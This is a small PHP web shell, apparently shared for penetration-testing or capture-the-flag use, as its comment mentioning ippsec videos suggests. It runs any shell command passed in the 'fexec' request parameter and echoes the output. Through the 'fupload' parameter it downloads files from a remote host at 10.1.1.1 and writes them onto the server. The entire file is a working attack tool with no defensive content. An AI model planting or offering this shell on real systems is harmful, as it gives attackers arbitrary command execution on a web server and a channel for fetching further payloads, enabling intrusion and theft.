<?php
/* A friend of mine, @B4x0, sent me this awesome script. I think I've watched it on @ippsec videos too */
      if(isset($_REQUEST['fupload'])) {
                file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.1.1.1/" . $_REQUEST['fupload']));
        }
        if(isset($_REQUEST['fexec'])) {
                echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
        }
?>
